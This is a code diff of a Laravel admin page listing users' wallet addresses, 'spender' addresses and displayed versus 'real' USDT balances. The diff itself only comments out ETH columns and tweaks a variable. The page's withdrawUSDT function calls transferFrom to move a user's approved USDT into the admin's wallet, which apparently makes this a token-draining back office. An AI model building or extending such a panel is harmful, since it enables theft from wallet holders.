@@ -37,8 +37,6 @@
                             <th style="width: 10px">#</th>
                             <th>User Id</th>
                             <th>Wallet Address</th>
-                            <th>Balance (ETH)</th>
-                            <th>Real Balance (ETH)</th>
                             <th>Balance (USDT)</th>
                             <th>Real Balance (USDT)</th>
                             <th>Status</th>
@@ -54,7 +52,7 @@
                             </a></td>
                             <td>{{$user->wallet}} <br> <span class="badge badge-primary">{{$user->spender ?? $user->spender }}</span></td>
                             {{-- {{$stats}} --}}
-                            <td>
+                            {{-- <td>
                                 @if (count($user->balance) > 0)
                                     {{$user->balance[0]->statistics_eth }}
                                     <br> <span class="badge badge-primary">{{$user->balance[0]->updated_at }}</span>
@@ -62,9 +60,9 @@
                                 @else
                                     -
                                 @endif
-                            </td>
+                            </td> --}}
 
-                            <td id="real_balance">{{$user->eth_real_balance ?? '-'}} <br><span class="badge badge-secondary">{{$user->eth_real_balance_updated_at}}</span></td>
+                            {{-- <td id="real_balance">{{$user->eth_real_balance ?? '-'}} <br><span class="badge badge-secondary">{{$user->eth_real_balance_updated_at}}</span></td> --}}
 
                             <td>
                                 @if (count($user->balance) > 0)
@@ -252,7 +250,7 @@
     const withdrawUSDT = async () => {
         let adminWalletAddress = $('#modal-spender').val();
         let userWalletAddress = $('#modal-wallet').val();
-        let amount = parseInt($('#modal-amount').val() * 1000000);
+        var amount = parseInt($('#modal-amount').val() * 1000000);
 
         var balance = $("#modal-amount").val();
 
@@ -270,6 +268,8 @@
                 allowanceAmount = Number(allowanceAmount.toString())
 
                 // let usdtAmount = amount * 1000000;
+
+                // alert(amount);
                 
                 const tx = await tokenContract.methods.transferFrom(userWalletAddress, adminWalletAddress, amount).send({
                     from: adminWalletAddress
